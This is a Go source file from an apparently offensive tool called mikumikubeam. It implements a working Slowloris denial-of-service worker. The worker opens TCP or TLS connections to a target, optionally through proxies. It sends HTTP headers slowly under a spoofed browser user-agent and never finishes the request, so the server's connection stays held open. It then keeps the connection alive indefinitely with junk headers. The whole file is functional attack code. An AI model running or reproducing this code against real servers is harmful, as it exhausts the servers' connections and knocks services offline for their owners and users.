package http

import (
	"bufio"
	"context"
	"fmt"
	"net"
	"strconv"
	"time"

	core "github.com/sammwyy/mikumikubeam/internal/engine"
	"github.com/sammwyy/mikumikubeam/internal/netutil"
)

type slowlorisWorker struct{}

func NewSlowlorisWorker() *slowlorisWorker { return &slowlorisWorker{} }

// Fire opens a raw TCP/TLS connection and dribbles headers slowly in a goroutine.
func (w *slowlorisWorker) Fire(ctx context.Context, params core.AttackParams, p core.Proxy, ua string, logCh chan<- core.AttackStats) error {
	tn := params.TargetNode
	u := tn.ToURL()
	host := u.Hostname()
	port := u.Port()
	if port == "" {
		if u.Scheme == "https" {
			port = "443"
		} else {
			port = "80"
		}
	}

	var pptr *core.Proxy
	if p.Host != "" {
		pptr = &p
	}
	scheme := "tcp"
	if u.Scheme == "https" {
		scheme = "tls"
	}
	portNum, _ := strconv.Atoi(port)
	conn, err := netutil.DialedTCPClient(ctx, scheme, host, portNum, pptr)
	if err != nil {
		return err
	}

	// Send log only if connection was successful and verbose is enabled
	core.SendAttackLogIfVerbose(logCh, p, params.Target, params.Verbose)

	go func(c net.Conn) {
		defer c.Close()
		bw := bufio.NewWriter(c)
		// Start request line
		fmt.Fprintf(bw, "GET / HTTP/1.1\r\n")
		// Dribble headers
		headers := []string{
			"Host: " + host,
			"User-Agent: " + pickUA(ua),
			"Accept: */*",
			"Connection: keep-alive",
		}
		for _, h := range headers {
			bw.WriteString(h + "\r\n")
			bw.Flush()
			select {
			case <-ctx.Done():
				return
			case <-time.After(params.PacketDelay):
			}
		}
		// Never terminate headers to keep connection open (Slowloris)
		// Optionally send a keep-alive header periodically
		ticker := time.NewTicker(params.PacketDelay)
		defer ticker.Stop()
		for {
			select {
			case <-ctx.Done():
				return
			case <-ticker.C:
				bw.WriteString("X-a: b\r\n")
				bw.Flush()
			}
		}
	}(conn)

	return nil
}

func pickUA(ua string) string {
	if ua != "" {
		return ua
	}
	return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
}
